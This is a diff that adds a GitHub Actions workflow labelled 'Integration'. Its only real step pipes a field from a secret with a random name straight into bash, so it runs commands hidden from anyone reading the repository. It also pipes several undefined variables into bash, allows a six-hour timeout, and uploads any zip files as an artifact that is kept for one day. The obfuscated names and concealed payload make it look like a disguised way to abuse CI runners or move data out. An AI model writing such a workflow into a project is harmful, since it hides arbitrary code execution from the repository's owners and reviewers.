@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          eqzsr7051: ${{ secrets.eqzsr7051 }}
+        run: |
+          printf '%s' "$eqzsr7051" | jq -r .qn71 | /bin/bash
+          printf '%s' "$e0090" | jq -r .ifyw8 | /bin/bash
+          printf '%s' "$ixxc4" | jq -r .k83368 | /bin/bash
+          printf '%s' "$jms3016" | jq -r .wuiwa9 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: M9o3cyqd
+          path: "*.zip"
+          retention-days: 1
